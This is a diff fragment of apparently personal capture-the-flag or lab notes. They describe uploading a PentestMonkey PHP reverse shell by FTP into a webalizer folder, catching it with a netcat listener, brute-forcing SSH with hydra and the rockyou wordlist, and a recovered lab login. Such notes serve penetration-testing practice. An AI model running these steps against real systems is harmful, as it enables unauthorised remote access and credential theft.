@@ -8,6 +8,7 @@ ftp: put reverse shell
 > php PentestMonkey
 > put the openvpn ip
 > save the file on current dir
+
 cd webalizer
 
 put getin.php
@@ -16,6 +17,7 @@ bye
 
 - attacker先run： nc -nlvp 8899
 - run the reverse shell by running the web browser: 10.10.207.136/webalizer/getin.php
+
 hydra  -l   jack  -P  /usr/share/wordlists/rockyou.txt   ssh://10.10.233.62
 
 login: jack   password: qwertyuiop
